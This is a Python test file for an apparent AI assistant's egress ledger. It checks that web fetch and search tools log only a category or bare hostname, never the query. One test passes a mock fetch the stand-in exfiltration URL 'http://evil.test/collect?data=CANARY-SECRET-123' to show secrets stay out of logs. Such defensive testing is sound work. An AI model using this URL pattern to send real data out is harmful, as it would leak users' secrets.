"""The egress ledger (amendment A5): a structured "what left the box" event.

Pins the helper's shape and the caller discipline that keeps secrets out of it — the web
tools log only a category (and, for fetch, a bare hostname), never the query string or the
URL path/query where an exfiltration payload would ride.
"""

from __future__ import annotations

import kira.tools.builtin.web as web
from kira.observability.egress import EGRESS_CATEGORIES, log_egress
from kira.tools.builtin.web import WebFetchParams, WebFetchTool, WebSearchParams, WebSearchTool


class _CapturingLogger:
    def __init__(self) -> None:
        self.events: list[tuple[str, dict]] = []

    def info(self, event: str, **kw: object) -> None:
        self.events.append((event, kw))


def test_log_egress_emits_structured_event() -> None:
    log = _CapturingLogger()
    log_egress(category="web_fetch", destination_type="public_web", detail="example.com", log=log)
    assert log.events == [
        (
            "egress",
            {"category": "web_fetch", "destination_type": "public_web", "detail": "example.com"},
        ),
    ]


def test_egress_categories_are_the_known_set() -> None:
    assert "gmail_draft" in EGRESS_CATEGORIES
    assert "notify_telegram" in EGRESS_CATEGORIES
    assert "notify_kakao" in EGRESS_CATEGORIES
    assert "digest_delivery" in EGRESS_CATEGORIES


async def test_web_fetch_logs_hostname_only_never_the_query(monkeypatch) -> None:
    # The canary rides in the URL query — exactly where exfil data would. The egress event
    # must carry only the bare hostname, never the path/query.
    captured: list[dict] = []
    monkeypatch.setattr(web, "log_egress", lambda **kw: captured.append(kw))

    async def _fake_fetch(url: str, timeout_seconds: float) -> str:
        return "<html><body><p>hello there, some readable content here</p></body></html>"

    monkeypatch.setattr(web, "_fetch_html", _fake_fetch)

    tool = WebFetchTool()
    await tool.run(WebFetchParams(url="http://evil.test/collect?data=CANARY-SECRET-123"))

    assert len(captured) == 1
    ev = captured[0]
    assert ev["category"] == "web_fetch"
    assert ev["destination_type"] == "public_web"
    assert ev["detail"] == "evil.test"  # hostname only
    assert "CANARY-SECRET-123" not in str(ev)  # the query never enters the ledger


async def test_web_search_logs_category_only_never_the_query(monkeypatch) -> None:
    captured: list[dict] = []
    monkeypatch.setattr(web, "log_egress", lambda **kw: captured.append(kw))

    async def _fake_search(api_key: str, query: str, max_results: int) -> dict:
        return {"results": []}

    monkeypatch.setattr(web, "_tavily_search", _fake_search)

    tool = WebSearchTool()
    # Give it a key so it reaches the egress path (config-less tool → inject a stub).
    tool.context.config = type("C", (), {"secrets": type("S", (), {"tavily_api_key": "k"})()})()
    await tool.run(WebSearchParams(query="find CANARY-SECRET-123 please"))

    assert len(captured) == 1
    ev = captured[0]
    assert ev == {"category": "web_search", "destination_type": "public_web"}  # no detail
    assert "CANARY-SECRET-123" not in str(ev)
